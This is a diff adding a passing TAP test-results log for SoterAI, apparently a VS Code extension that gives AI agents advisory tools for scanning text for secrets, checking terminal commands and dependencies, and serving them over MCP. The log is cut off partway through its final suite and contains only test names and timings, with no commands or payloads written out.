@@ -1,0 +1,4258 @@
+TAP version 13
+# Subtest: the manifest contributes the tools an agent can call
+    # Subtest: declares languageModelTools at all
+    ok 1 - declares languageModelTools at all
+      ---
+      duration_ms: 4.7393
+      type: 'test'
+      ...
+    # Subtest: declares an MCP server definition provider for non-Copilot agents
+    ok 2 - declares an MCP server definition provider for non-Copilot agents
+      ---
+      duration_ms: 0.6872
+      type: 'test'
+      ...
+    # Subtest: uses the {verb}_{noun} naming VS Code asks for
+    ok 3 - uses the {verb}_{noun} naming VS Code asks for
+      ---
+      duration_ms: 2.1893
+      type: 'test'
+      ...
+    # Subtest: states the advisory limit in every model-facing description
+    ok 4 - states the advisory limit in every model-facing description
+      ---
+      duration_ms: 0.4792
+      type: 'test'
+      ...
+    # Subtest: gives every tool an input schema and a user-facing description
+    ok 5 - gives every tool an input schema and a user-facing description
+      ---
+      duration_ms: 0.6597
+      type: 'test'
+      ...
+    1..5
+ok 1 - the manifest contributes the tools an agent can call
+  ---
+  duration_ms: 14.1939
+  type: 'suite'
+  ...
+# Subtest: the manifest, the code, and the MCP server agree on the tool set
+    # Subtest: registers exactly the tools the manifest declares
+    ok 1 - registers exactly the tools the manifest declares
+      ---
+      duration_ms: 4.4623
+      type: 'test'
+      ...
+    # Subtest: exposes the same tools over MCP as in chat
+    ok 2 - exposes the same tools over MCP as in chat
+      ---
+      duration_ms: 0.6163
+      type: 'test'
+      ...
+    # Subtest: routes every tool to a callable handler
+    ok 3 - routes every tool to a callable handler
+      ---
+      duration_ms: 0.9179
+      type: 'test'
+      ...
+    1..3
+ok 2 - the manifest, the code, and the MCP server agree on the tool set
+  ---
+  duration_ms: 7.2288
+  type: 'suite'
+  ...
+# Subtest: soterai_scan_text
+    # Subtest: blocks a secret smuggled alongside an injection
+    ok 1 - blocks a secret smuggled alongside an injection
+      ---
+      duration_ms: 135.2671
+      type: 'test'
+      ...
+    # Subtest: warns and hands back a redacted copy when the text is only a secret
+    ok 2 - warns and hands back a redacted copy when the text is only a secret
+      ---
+      duration_ms: 7.3293
+      type: 'test'
+      ...
+    # Subtest: never puts the raw secret anywhere in the result
+    ok 3 - never puts the raw secret anywhere in the result
+      ---
+      duration_ms: 2.8111
+      type: 'test'
+      ...
+    # Subtest: allows ordinary code without crying wolf
+    ok 4 - allows ordinary code without crying wolf
+      ---
+      duration_ms: 1.042
+      type: 'test'
+      ...
+    # Subtest: says so when a finding only surfaced after de-obfuscation
+    ok 5 - says so when a finding only surfaced after de-obfuscation
+      ---
+      duration_ms: 36.1755
+      type: 'test'
+      ...
+    # Subtest: treats a missing or non-string input as nothing to check
+    ok 6 - treats a missing or non-string input as nothing to check
+      ---
+      duration_ms: 0.6788
+      type: 'test'
+      ...
+    1..6
+ok 3 - soterai_scan_text
+  ---
+  duration_ms: 184.2419
+  type: 'suite'
+  ...
+# Subtest: soterai_check_command
+    # Subtest: blocks the commands an agent should never run unasked
+    ok 1 - blocks the commands an agent should never run unasked
+      ---
+      duration_ms: 13.6407
+      type: 'test'
+      ...
+    # Subtest: names the matched pattern so the agent can explain itself
+    ok 2 - names the matched pattern so the agent can explain itself
+      ---
+      duration_ms: 0.8987
+      type: 'test'
+      ...
+    # Subtest: warns rather than blocks on a merely risky command
+    ok 3 - warns rather than blocks on a merely risky command
+      ---
+      duration_ms: 0.7522
+      type: 'test'
+      ...
+    # Subtest: allows an ordinary command and admits the check is pattern-based
+    ok 4 - allows an ordinary command and admits the check is pattern-based
+      ---
+      duration_ms: 0.5067
+      type: 'test'
+      ...
+    1..4
+ok 4 - soterai_check_command
+  ---
+  duration_ms: 16.3906
+  type: 'suite'
+  ...
+# Subtest: soterai_check_dependency
+    # Subtest: flags a typo-squat from a whole install command
+    ok 1 - flags a typo-squat from a whole install command
+      ---
+      duration_ms: 2.9522
+      type: 'test'
+      ...
+    # Subtest: accepts a bare name and version, because an agent has both shapes
+    ok 2 - accepts a bare name and version, because an agent has both shapes
+      ---
+      duration_ms: 0.5817
+      type: 'test'
+      ...
+    # Subtest: flags a piped-shell install as the worst case
+    ok 3 - flags a piped-shell install as the worst case
+      ---
+      duration_ms: 1.9369
+      type: 'test'
+      ...
+    # Subtest: admits no CVE database was consulted
+    ok 4 - admits no CVE database was consulted
+      ---
+      duration_ms: 2.3292
+      type: 'test'
+      ...
+    # Subtest: treats an empty request as nothing to check
+    ok 5 - treats an empty request as nothing to check
+      ---
+      duration_ms: 0.3448
+      type: 'test'
+      ...
+    1..5
+ok 5 - soterai_check_dependency
+  ---
+  duration_ms: 9.0496
+  type: 'suite'
+  ...
+# Subtest: every result states its own limits
+    # Subtest: carries the advisory coverage note on all three tools
+    ok 1 - carries the advisory coverage note on all three tools
+      ---
+      duration_ms: 1.1842
+      type: 'test'
+      ...
+    # Subtest: says plainly that it cannot block the action
+    ok 2 - says plainly that it cannot block the action
+      ---
+      duration_ms: 0.3823
+      type: 'test'
+      ...
+    1..2
+ok 6 - every result states its own limits
+  ---
+  duration_ms: 1.8675
+  type: 'suite'
+  ...
+# Subtest: the MCP server speaks the protocol
+    # Subtest: answers initialize with a tools capability
+    ok 1 - answers initialize with a tools capability
+      ---
+      duration_ms: 1.0617
+      type: 'test'
+      ...
+    # Subtest: lists all three tools with schemas
+    ok 2 - lists all three tools with schemas
+      ---
+      duration_ms: 0.3768
+      type: 'test'
+      ...
+    # Subtest: runs a tool call and returns text content
+    ok 3 - runs a tool call and returns text content
+      ---
+      duration_ms: 0.5414
+      type: 'test'
+      ...
+    # Subtest: reports a block verdict as a successful call, not a protocol error
+    ok 4 - reports a block verdict as a successful call, not a protocol error
+      ---
+      duration_ms: 0.4237
+      type: 'test'
+      ...
+    # Subtest: never returns a raw secret over the wire
+    ok 5 - never returns a raw secret over the wire
+      ---
+      duration_ms: 1.5537
+      type: 'test'
+      ...
+    # Subtest: rejects an unknown tool with an error rather than a silent success
+    ok 6 - rejects an unknown tool with an error rather than a silent success
+      ---
+      duration_ms: 0.6296
+      type: 'test'
+      ...
+    # Subtest: stays silent on notifications, as JSON-RPC requires
+    ok 7 - stays silent on notifications, as JSON-RPC requires
+      ---
+      duration_ms: 0.4155
+      type: 'test'
+      ...
+    # Subtest: answers an unknown method instead of throwing
+    ok 8 - answers an unknown method instead of throwing
+      ---
+      duration_ms: 0.3254
+      type: 'test'
+      ...
+    # Subtest: survives garbage without crashing the server
+    ok 9 - survives garbage without crashing the server
+      ---
+      duration_ms: 3.8777
+      type: 'test'
+      ...
+    1..9
+ok 7 - the MCP server speaks the protocol
+  ---
+  duration_ms: 10.7346
+  type: 'suite'
+  ...
+# Subtest: the MCP stdio transport stays bounded and synchronized
+    # Subtest: discards the rest of one oversized frame and recovers at the next newline
+    ok 1 - discards the rest of one oversized frame and recovers at the next newline
+      ---
+      duration_ms: 21.8698
+      type: 'test'
+      ...
+    # Subtest: processes valid complete frames even when one input chunk is over the buffer cap
+    ok 2 - processes valid complete frames even when one input chunk is over the buffer cap
+      ---
+      duration_ms: 768.6422
+      type: 'test'
+      ...
+    1..2
+ok 8 - the MCP stdio transport stays bounded and synchronized
+  ---
+  duration_ms: 791.0088
+  type: 'suite'
+  ...
+# Subtest: the MCP path never imports vscode
+    # Subtest: keeps every module the server depends on free of vscode
+    ok 1 - keeps every module the server depends on free of vscode
+      ---
+      duration_ms: 8.5679
+      type: 'test'
+      ...
+    # Subtest: proves the comment-stripping cannot mask a real import
+    ok 2 - proves the comment-stripping cannot mask a real import
+      ---
+      duration_ms: 0.9807
+      type: 'test'
+      ...
+    # Subtest: bundles the server as its own entry point
+    ok 3 - bundles the server as its own entry point
+      ---
+      duration_ms: 0.8583
+      type: 'test'
+      ...
+    # Subtest: points the provider at the file the build actually emits
+    ok 4 - points the provider at the file the build actually emits
+      ---
+      duration_ms: 0.8393
+      type: 'test'
+      ...
+    # Subtest: ships the server bundle in the VSIX
+    ok 5 - ships the server bundle in the VSIX
+      ---
+      duration_ms: 9.1928
+      type: 'test'
+      ...
+    1..5
+ok 9 - the MCP path never imports vscode
+  ---
+  duration_ms: 21.085
+  type: 'suite'
+  ...
+# Subtest: agent surface reporting
+    # Subtest: names the host limitation when the API is absent
+    ok 1 - names the host limitation when the API is absent
+      ---
+      duration_ms: 0.7212
+      type: 'test'
+      ...
+    # Subtest: reports the real count, and still states the advisory limit
+    ok 2 - reports the real count, and still states the advisory limit
+      ---
+      duration_ms: 0.7083
+      type: 'test'
+      ...
+    # Subtest: does not claim an MCP provider it failed to register
+    ok 3 - does not claim an MCP provider it failed to register
+      ---
+      duration_ms: 0.5418
+      type: 'test'
+      ...
+    1..3
+ok 10 - agent surface reporting
+  ---
+  duration_ms: 2.6834
+  type: 'suite'
+  ...
+# Subtest: contributing agent tools does not make SoterAI classify itself as an AI tool
+    # Subtest: still returns none for its own real manifest
+    ok 1 - still returns none for its own real manifest
+      ---
+      duration_ms: 526.3629
+      type: 'test'
+      ...
+    # Subtest: holds even when the caller does not pass a self id
+    ok 2 - holds even when the caller does not pass a self id
+      ---
+      duration_ms: 162.2056
+      type: 'test'
+      ...
+    # Subtest: does not promote the two contribution points SoterAI now declares
+    ok 3 - does not promote the two contribution points SoterAI now declares
+      ---
+      duration_ms: 74.8699
+      type: 'test'
+      ...
+    1..3
+ok 11 - contributing agent tools does not make SoterAI classify itself as an AI tool
+  ---
+  duration_ms: 766.717
+  type: 'suite'
+  ...
+# Subtest: deny globs cover dotfiles, directory descendants, roots and Windows case
+ok 12 - deny globs cover dotfiles, directory descendants, roots and Windows case
+  ---
+  duration_ms: 53.5453
+  type: 'test'
+  ...
+# Subtest: invalid policies cannot silently drop rules or negate defaults
+ok 13 - invalid policies cannot silently drop rules or negate defaults
+  ---
+  duration_ms: 76.752
+  type: 'test'
+  ...
+# Subtest: regions merge, contain no plaintext in storage, and block changed documents
+ok 14 - regions merge, contain no plaintext in storage, and block changed documents
+  ---
+  duration_ms: 159.4604
+  type: 'test'
+  ...
+# Subtest: .aiignore and manual folder rules exclude arbitrary data before gathering
+ok 15 - .aiignore and manual folder rules exclude arbitrary data before gathering
+  ---
+  duration_ms: 3355.3496
+  type: 'test'
+  ...
+# Subtest: defaults apply before reading even when Protected Workspace Mode is off
+ok 16 - defaults apply before reading even when Protected Workspace Mode is off
+  ---
+  duration_ms: 1676.1886
+  type: 'test'
+  ...
+# Subtest: malformed/unreadable policy blocks its root and a repaired policy reloads
+ok 17 - malformed/unreadable policy blocks its root and a repaired policy reloads
+  ---
+  duration_ms: 56.0639
+  type: 'test'
+  ...
+# Subtest: project denies are additive; empty protectedFiles cannot remove defaults
+ok 18 - project denies are additive; empty protectedFiles cannot remove defaults
+  ---
+  duration_ms: 28.7954
+  type: 'test'
+  ...
+# Subtest: region redaction precedes selection extraction; stale edits block entire content
+ok 19 - region redaction precedes selection extraction; stale edits block entire content
+  ---
+  duration_ms: 4289.7382
+  type: 'test'
+  ...
+# Subtest: bounded reads reject hardlinks, junctions, external paths, binary and invalid UTF-8
+ok 20 - bounded reads reject hardlinks, junctions, external paths, binary and invalid UTF-8
+  ---
+  duration_ms: 52.0403
+  type: 'test'
+  ...
+# Subtest: a symlinked .aiignore fails closed
+ok 21 - a symlinked .aiignore fails closed
+  ---
+  duration_ms: 19.8334
+  type: 'test'
+  ...
+# Subtest: Git diff obeys file, custom-glob and protected-region boundaries
+ok 22 - Git diff obeys file, custom-glob and protected-region boundaries
+  ---
+  duration_ms: 8974.3986
+  type: 'test'
+  ...
+# Subtest: redacted virtual documents use opaque URIs and re-evaluate new deny rules
+ok 23 - redacted virtual documents use opaque URIs and re-evaluate new deny rules
+  ---
+  duration_ms: 344.2894
+  type: 'test'
+  ...
+# Subtest: Explorer Block from AI uses clicked folder, not the active editor
+ok 24 - Explorer Block from AI uses clicked folder, not the active editor
+  ---
+  duration_ms: 116.2668
+  type: 'test'
+  ...
+# Subtest: multi-root .aiignore rules do not bleed between identically named paths
+ok 25 - multi-root .aiignore rules do not bleed between identically named paths
+  ---
+  duration_ms: 39.6082
+  type: 'test'
+  ...
+# Subtest: corrupt manual state denies instead of silently discarding a region
+ok 26 - corrupt manual state denies instead of silently discarding a region
+  ---
+  duration_ms: 88.1993
+  type: 'test'
+  ...
+# Subtest: fake provider keys never survive a normal file into a safe context bundle
+ok 27 - fake provider keys never survive a normal file into a safe context bundle
+  ---
+  duration_ms: 688.1317
+  type: 'test'
+  ...
+# Subtest: the extensions that produced the inflated count are not AI tools
+ok 28 - the extensions that produced the inflated count are not AI tools
+  ---
+  duration_ms: 6.6592
+  type: 'test'
+  ...
+# Subtest: SoterAI does not count itself as an unprotected AI tool
+ok 29 - SoterAI does not count itself as an unprotected AI tool
+  ---
+  duration_ms: 0.7916
+  type: 'test'
+  ...
+# Subtest: "ai" counts as a signal only when it is a whole id segment
+ok 30 - "ai" counts as a signal only when it is a whole id segment
+  ---
+  duration_ms: 2.5788
+  type: 'test'
+  ...
+# Subtest: routable and unmanaged AI tools are separated, not lumped together
+ok 31 - routable and unmanaged AI tools are separated, not lumped together
+  ---
+  duration_ms: 0.4906
+  type: 'test'
+  ...
+# Subtest: a real AI tool is still detected even when its exact id is unknown
+ok 32 - a real AI tool is still detected even when its exact id is unknown
+  ---
+  duration_ms: 0.6952
+  type: 'test'
+  ...
+# Subtest: an unroutable tool is never reported as routable
+ok 33 - an unroutable tool is never reported as routable
+  ---
+  duration_ms: 0.4525
+  type: 'test'
+  ...
+# Subtest: the census over a realistic machine reports a defensible count
+ok 34 - the census over a realistic machine reports a defensible count
+  ---
+  duration_ms: 3.8187
+  type: 'test'
+  ...
+# Subtest: every classification carries a reason a user could be shown
+ok 35 - every classification carries a reason a user could be shown
+  ---
+  duration_ms: 2.9348
+  type: 'test'
+  ...
+# Subtest: real AI tools found on a real machine are all detected
+ok 36 - real AI tools found on a real machine are all detected
+  ---
+  duration_ms: 1.4388
+  type: 'test'
+  ...
+# Subtest: an extension's own manifest can identify it when the id cannot
+ok 37 - an extension's own manifest can identify it when the id cannot
+  ---
+  duration_ms: 2.881
+  type: 'test'
+  ...
+# Subtest: exposing tools TO an AI does not make an extension an AI tool
+ok 38 - exposing tools TO an AI does not make an extension an AI tool
+  ---
+  duration_ms: 0.9604
+  type: 'test'
+  ...
+# Subtest: a routable tool stays routable even though its manifest declares AI
+ok 39 - a routable tool stays routable even though its manifest declares AI
+  ---
+  duration_ms: 0.3735
+  type: 'test'
+  ...
+# Subtest: SoterAI declares category AI itself and still must not count
+ok 40 - SoterAI declares category AI itself and still must not count
+  ---
+  duration_ms: 0.3236
+  type: 'test'
+  ...
+# Subtest: proposeBrokerRewrite never corrupts the file it claims to protect
+    # Subtest: refuses to append a shell directive to JSON with no base-URL field
+    ok 1 - refuses to append a shell directive to JSON with no base-URL field
+      ---
+      duration_ms: 7.7169
+      type: 'test'
+      ...
+    # Subtest: refuses YAML with no base-URL field rather than breaking the document
+    ok 2 - refuses YAML with no base-URL field rather than breaking the document
+      ---
+      duration_ms: 0.7946
+      type: 'test'
+      ...
+    # Subtest: edits an existing base-URL field in place and keeps JSON parseable
+    ok 3 - edits an existing base-URL field in place and keeps JSON parseable
+      ---
+      duration_ms: 0.6973
+      type: 'test'
+      ...
+    # Subtest: writes `export` in shell profiles so child processes actually inherit the var
+    ok 4 - writes `export` in shell profiles so child processes actually inherit the var
+      ---
+      duration_ms: 2.8681
+      type: 'test'
+      ...
+    # Subtest: omits `export` in .env files, which dotenv loaders would treat as part of the key
+    ok 5 - omits `export` in .env files, which dotenv loaders would treat as part of the key
+      ---
+      duration_ms: 1.513
+      type: 'test'
+      ...
+    # Subtest: routes anthropic and openai kinds to their own broker paths
+    ok 6 - routes anthropic and openai kinds to their own broker paths
+      ---
+      duration_ms: 0.8085
+      type: 'test'
+      ...
+    1..6
+ok 41 - proposeBrokerRewrite never corrupts the file it claims to protect
+  ---
+  duration_ms: 33.2089
+  type: 'suite'
+  ...
+# Subtest: detectConfigFormat
+    # Subtest: classifies by filename first
+    ok 1 - classifies by filename first
+      ---
+      duration_ms: 1.7356
+      type: 'test'
+      ...
+    # Subtest: falls back to content shape for unnamed files
+    ok 2 - falls back to content shape for unnamed files
+      ---
+      duration_ms: 3.1547
+      type: 'test'
+      ...
+    1..2
+ok 42 - detectConfigFormat
+  ---
+  duration_ms: 5.7452
+  type: 'suite'
+  ...
+# Subtest: discoverAllAiTools path anchoring
+    # Subtest: resolves workspace-relative candidates against the workspace, not the host cwd
+    ok 1 - resolves workspace-relative candidates against the workspace, not the host cwd
+      ---
+      duration_ms: 9.4137
+      type: 'test'
+      ...
+    # Subtest: skips relative candidates entirely when no workspace is open
+    ok 2 - skips relative candidates entirely when no workspace is open
+      ---
+      duration_ms: 1.7131
+      type: 'test'
+      ...
+    # Subtest: reports monitor-only tools as monitor-only, never as covered
+    ok 3 - reports monitor-only tools as monitor-only, never as covered
+      ---
+      duration_ms: 0.9161
+      type: 'test'
+      ...
+    # Subtest: every auto-securable tool declares at least one config candidate
+    ok 4 - every auto-securable tool declares at least one config candidate
+      ---
+      duration_ms: 0.433
+      type: 'test'
+      ...
+    1..4
+ok 43 - discoverAllAiTools path anchoring
+  ---
+  duration_ms: 13.328
+  type: 'suite'
+  ...
+# Subtest: buildSecurePlan honesty
+    # Subtest: reports a JSON config it refused to rewrite instead of claiming coverage
+    ok 1 - reports a JSON config it refused to rewrite instead of claiming coverage
+      ---
+      duration_ms: 4.6588
+      type: 'test'
+      ...
+    # Subtest: keeps each config's own kind rather than coercing everything to anthropic
+    ok 2 - keeps each config's own kind rather than coercing everything to anthropic
+      ---
+      duration_ms: 1.8174
+      type: 'test'
+      ...
+    1..2
+ok 44 - buildSecurePlan honesty
+  ---
+  duration_ms: 7.1135
+  type: 'suite'
+  ...
+# Subtest: executeSecurePlan
+    # Subtest: refuses to rewrite anything while the broker is offline
+    ok 1 - refuses to rewrite anything while the broker is offline
+      ---
+      duration_ms: 2.6326
+      type: 'test'
+      ...
+    # Subtest: does not claim redaction when the smoke test fails
+    ok 2 - does not claim redaction when the smoke test fails
+      ---
+      duration_ms: 2.5106
+      type: 'test'
+      ...
+    # Subtest: applies, backs up, and round-trips through restoreAll
+    ok 3 - applies, backs up, and round-trips through restoreAll
+      ---
+      duration_ms: 2.5873
+      type: 'test'
+      ...
+    # Subtest: writes nothing when the user did not approve
+    ok 4 - writes nothing when the user did not approve
+      ---
+      duration_ms: 1.8904
+      type: 'test'
+      ...
+    1..4
+ok 45 - executeSecurePlan
+  ---
+  duration_ms: 10.1855
+  type: 'suite'
+  ...
+# Subtest: bounded broker response reader
+    # Subtest: reads a normal JSON response
+    ok 1 - reads a normal JSON response
+      ---
+      duration_ms: 136.2569
+      type: 'test'
+      ...
+    # Subtest: rejects a declared oversized response before consuming it
+    ok 2 - rejects a declared oversized response before consuming it
+      ---
+      duration_ms: 45.6856
+      type: 'test'
+      ...
+    # Subtest: rejects an oversized streamed response even without content-length
+    ok 3 - rejects an oversized streamed response even without content-length
+      ---
+      duration_ms: 39.0634
+      type: 'test'
+      ...
+    # Subtest: decodes a multibyte character split across chunks
+    ok 4 - decodes a multibyte character split across chunks
+      ---
+      duration_ms: 30.5249
+      type: 'test'
+      ...
+    # Subtest: survives deterministic chunk-boundary fuzz without changing valid UTF-8
+    ok 5 - survives deterministic chunk-boundary fuzz without changing valid UTF-8
+      ---
+      duration_ms: 465.0189
+      type: 'test'
+      ...
+    1..5
+ok 46 - bounded broker response reader
+  ---
+  duration_ms: 730.5723
+  type: 'suite'
+  ...
+# Subtest: broker auto-start: the broker actually starts
+    # Subtest: starts the broker on activation — the whole point of the feature
+    ok 1 - starts the broker on activation — the whole point of the feature
+      ---
+      duration_ms: 4.5151
+      type: 'test'
+      ...
+    # Subtest: does not start when the user turned auto-start off, and records that protection is advisory
+    ok 2 - does not start when the user turned auto-start off, and records that protection is advisory
+      ---
+      duration_ms: 1.2967
+      type: 'test'
+      ...
+    1..2
+ok 47 - broker auto-start: the broker actually starts
+  ---
+  duration_ms: 10.587
+  type: 'suite'
+  ...
+# Subtest: broker auto-start: failures are never silent
+    # Subtest: retries a transient failure and succeeds — a slow first spawn is not a dead broker
+    ok 1 - retries a transient failure and succeeds — a slow first spawn is not a dead broker
+      ---
+      duration_ms: 9.6524
+      type: 'test'
+      ...
+    # Subtest: does NOT retry a port conflict — three identical errors only delay the truth
+    ok 2 - does NOT retry a port conflict — three identical errors only delay the truth
+      ---
+      duration_ms: 1.0937
+      type: 'test'
+      ...
+    # Subtest: tells the user enforcement is OFF when every attempt fails — not just that a start failed
+    ok 3 - tells the user enforcement is OFF when every attempt fails — not just that a start failed
+      ---
+      duration_ms: 0.9665
+      type: 'test'
+      ...
+    # Subtest: offers a way forward and runs what the user picks
+    ok 4 - offers a way forward and runs what the user picks
+      ---
+      duration_ms: 3.8684
+      type: 'test'
+      ...
+    # Subtest: stays quiet when the user dismisses the notification
+    ok 5 - stays quiet when the user dismisses the notification
+      ---
+      duration_ms: 1.6409
+      type: 'test'
+      ...
+    # Subtest: treats an UNKNOWN error as retryable — an unexpected fault is the worst case to give up on
+    ok 6 - treats an UNKNOWN error as retryable — an unexpected fault is the worst case to give up on
+      ---
+      duration_ms: 1.6573
+      type: 'test'
+      ...
+    1..6
+ok 48 - broker auto-start: failures are never silent
+  ---
+  duration_ms: 20.5402
+  type: 'suite'
+  ...
+# Subtest: broker auto-start: lockdown is the guard working, not a fault
+    # Subtest: does not alarm the user when Emergency Lockdown blocks the start
+    ok 1 - does not alarm the user when Emergency Lockdown blocks the start
+      ---
+      duration_ms: 1.4182
+      type: 'test'
+      ...
+    1..1
+ok 49 - broker auto-start: lockdown is the guard working, not a fault
+  ---
+  duration_ms: 2.2884
+  type: 'suite'
+  ...
+# Subtest: broker start failures carry retryability as a flag, not as prose
+    # Subtest: keys retries on the typed flag so a copy edit cannot change enforcement
+    ok 1 - keys retries on the typed flag so a copy edit cannot change enforcement
+      ---
+      duration_ms: 1.6576
+      type: 'test'
+      ...
+    1..1
+ok 50 - broker start failures carry retryability as a flag, not as prose
+  ---
+  duration_ms: 2.0031
+  type: 'suite'
+  ...
+# Subtest: Command Palette hygiene
+    # Subtest: has commands to check
+    ok 1 - has commands to check
+      ---
+      duration_ms: 2.9144
+      type: 'test'
+      ...
+    # Subtest: never renders the SoterAI prefix twice
+    ok 2 - never renders the SoterAI prefix twice
+      ---
+      duration_ms: 4.2311
+      type: 'test'
+      ...
+    # Subtest: gives every command the SoterAI category so it is findable by typing 'soterai'
+    ok 3 - gives every command the SoterAI category so it is findable by typing 'soterai'
+      ---
+      duration_ms: 0.5589
+      type: 'test'
+      ...
+    # Subtest: gives no two commands the same palette text
+    ok 4 - gives no two commands the same palette text
+      ---
+      duration_ms: 1.8002
+      type: 'test'
+      ...
+    # Subtest: keeps every title free of leading/trailing whitespace and empty titles
+    ok 5 - keeps every title free of leading/trailing whitespace and empty titles
+      ---
+      duration_ms: 1.352
+      type: 'test'
+      ...
+    # Subtest: declares every command in contributes.commands exactly once
+    ok 6 - declares every command in contributes.commands exactly once
+      ---
+      duration_ms: 1.023
+      type: 'test'
+      ...
+    1..6
+ok 51 - Command Palette hygiene
+  ---
+  duration_ms: 16.8733
+  type: 'suite'
+  ...
+# Subtest: activationEvents stay minimal
+    # Subtest: lists no onCommand: events, because VS Code generates them
+    ok 1 - lists no onCommand: events, because VS Code generates them
+      ---
+      duration_ms: 1.2028
+      type: 'test'
+      ...
+    # Subtest: keeps the events that are NOT generated
+    ok 2 - keeps the events that are NOT generated
+      ---
+      duration_ms: 2.5141
+      type: 'test'
+      ...
+    # Subtest: still activates eagerly, because a lazily-activated security guard protects nothing
+    ok 3 - still activates eagerly, because a lazily-activated security guard protects nothing
+      ---
+      duration_ms: 0.9435
+      type: 'test'
+      ...
+    1..3
+ok 52 - activationEvents stay minimal
+  ---
+  duration_ms: 6.3533
+  type: 'suite'
+  ...
+# Subtest: deprecated aliases stay callable but leave the palette
+    # Subtest: soterai.scanSelectedText is still declared and registered, so nothing that calls it breaks
+    ok 1 - soterai.scanSelectedText is still declared and registered, so nothing that calls it breaks
+      ---
+      duration_ms: 16.3916
+      type: 'test'
+      ...
+    # Subtest: soterai.scanSelectedText is hidden from the palette in favour of soterai.scanSelection
+    ok 2 - soterai.scanSelectedText is hidden from the palette in favour of soterai.scanSelection
+      ---
+      duration_ms: 6.0473
+      type: 'test'
+      ...
+    # Subtest: soterai.scanSelection is the one the palette offers
+    ok 3 - soterai.scanSelection is the one the palette offers
+      ---
+      duration_ms: 3.6663
+      type: 'test'
+      ...
+    # Subtest: soterai.scanGitDiff is still declared and registered, so nothing that calls it breaks
+    ok 4 - soterai.scanGitDiff is still declared and registered, so nothing that calls it breaks
+      ---
+      duration_ms: 2.4231
+      type: 'test'
+      ...
+    # Subtest: soterai.scanGitDiff is hidden from the palette in favour of soterai.scanGitChanges
+    ok 5 - soterai.scanGitDiff is hidden from the palette in favour of soterai.scanGitChanges
+      ---
+      duration_ms: 5.2477
+      type: 'test'
+      ...
+    # Subtest: soterai.scanGitChanges is the one the palette offers
+    ok 6 - soterai.scanGitChanges is the one the palette offers
+      ---
+      duration_ms: 0.3063
+      type: 'test'
+      ...
+    # Subtest: soterai.reviewTerminalCommand is still declared and registered, so nothing that calls it breaks
+    ok 7 - soterai.reviewTerminalCommand is still declared and registered, so nothing that calls it breaks
+      ---
+      duration_ms: 1.0039
+      type: 'test'
+      ...
+    # Subtest: soterai.reviewTerminalCommand is hidden from the palette in favour of soterai.checkTerminalCommand
+    ok 8 - soterai.reviewTerminalCommand is hidden from the palette in favour of soterai.checkTerminalCommand
+      ---
+      duration_ms: 0.6198
+      type: 'test'
+      ...
+    # Subtest: soterai.checkTerminalCommand is the one the palette offers
+    ok 9 - soterai.checkTerminalCommand is the one the palette offers
+      ---
+      duration_ms: 0.9435
+      type: 'test'
+      ...
+    # Subtest: soterai.choosePolicyPack is still declared and registered, so nothing that calls it breaks
+    ok 10 - soterai.choosePolicyPack is still declared and registered, so nothing that calls it breaks
+      ---
+      duration_ms: 1.6172
+      type: 'test'
+      ...
+    # Subtest: soterai.choosePolicyPack is hidden from the palette in favour of soterai.applyPolicyPack
+    ok 11 - soterai.choosePolicyPack is hidden from the palette in favour of soterai.applyPolicyPack
+      ---
+      duration_ms: 0.4037
+      type: 'test'
+      ...
+    # Subtest: soterai.applyPolicyPack is the one the palette offers
+    ok 12 - soterai.applyPolicyPack is the one the palette offers
+      ---
+      duration_ms: 0.213
+      type: 'test'
+      ...
+    # Subtest: soterai.openSecurityPanel is still declared and registered, so nothing that calls it breaks
+    ok 13 - soterai.openSecurityPanel is still declared and registered, so nothing that calls it breaks
+      ---
+      duration_ms: 0.5322
+      type: 'test'
+      ...
+    # Subtest: soterai.openSecurityPanel is hidden from the palette in favour of soterai.openControlPanel
+    ok 14 - soterai.openSecurityPanel is hidden from the palette in favour of soterai.openControlPanel
+      ---
+      duration_ms: 1.1408
+      type: 'test'
+      ...
+    # Subtest: soterai.openControlPanel is the one the palette offers
+    ok 15 - soterai.openControlPanel is the one the palette offers
+      ---
+      duration_ms: 0.385
+      type: 'test'
+      ...
+    # Subtest: soterai.scanMCPAgentTools is still declared and registered, so nothing that calls it breaks
+    ok 16 - soterai.scanMCPAgentTools is still declared and registered, so nothing that calls it breaks
+      ---
+      duration_ms: 0.6433
+      type: 'test'
+      ...
+    # Subtest: soterai.scanMCPAgentTools is hidden from the palette in favour of soterai.scanMCPConfigs
+    ok 17 - soterai.scanMCPAgentTools is hidden from the palette in favour of soterai.scanMCPConfigs
+      ---
+      duration_ms: 0.6722
+      type: 'test'
+      ...
+    # Subtest: soterai.scanMCPConfigs is the one the palette offers
+    ok 18 - soterai.scanMCPConfigs is the one the palette offers
+      ---
+      duration_ms: 0.9091
+      type: 'test'
+      ...
+    # Subtest: soterai.openAIActivityLedger is still declared and registered, so nothing that calls it breaks
+    ok 19 - soterai.openAIActivityLedger is still declared and registered, so nothing that calls it breaks
+      ---
+      duration_ms: 0.6483
+      type: 'test'
+      ...
+    # Subtest: soterai.openAIActivityLedger is hidden from the palette in favour of soterai.openAILedger
+    ok 20 - soterai.openAIActivityLedger is hidden from the palette in favour of soterai.openAILedger
+      ---
+      duration_ms: 0.4893
+      type: 'test'
+      ...
+    # Subtest: soterai.openAILedger is the one the palette offers
+    ok 21 - soterai.openAILedger is the one the palette offers
+      ---
+      duration_ms: 0.2523
+      type: 'test'
+      ...
+    # Subtest: soterai.generateCanaryToken is still declared and registered, so nothing that calls it breaks
+    ok 22 - soterai.generateCanaryToken is still declared and registered, so nothing that calls it breaks
+      ---
+      duration_ms: 0.2064
+      type: 'test'
+      ...
+    # Subtest: soterai.generateCanaryToken is hidden from the palette in favour of soterai.generateCanary
+    ok 23 - soterai.generateCanaryToken is hidden from the palette in favour of soterai.generateCanary
+      ---
+      duration_ms: 0.1925
+      type: 'test'
+      ...
+    # Subtest: soterai.generateCanary is the one the palette offers
+    ok 24 - soterai.generateCanary is the one the palette offers
+      ---
+      duration_ms: 0.1993
+      type: 'test'
+      ...
+    1..24
+ok 53 - deprecated aliases stay callable but leave the palette
+  ---
+  duration_ms: 56.7886
+  type: 'suite'
+  ...
+# Subtest: no two palette-visible commands describe the same workflow
+    # Subtest: gives every visible command a distinct normalised title
+    ok 1 - gives every visible command a distinct normalised title
+      ---
+      duration_ms: 5.0271
+      type: 'test'
+      ...
+    1..1
+ok 54 - no two palette-visible commands describe the same workflow
+  ---
+  duration_ms: 5.6415
+  type: 'suite'
+  ...
+# Subtest: one Open Report entry point replaces eighteen show* rows
+    # Subtest: offers a quick pick that lists the reports
+    ok 1 - offers a quick pick that lists the reports
+      ---
+      duration_ms: 0.8792
+      type: 'test'
+      ...
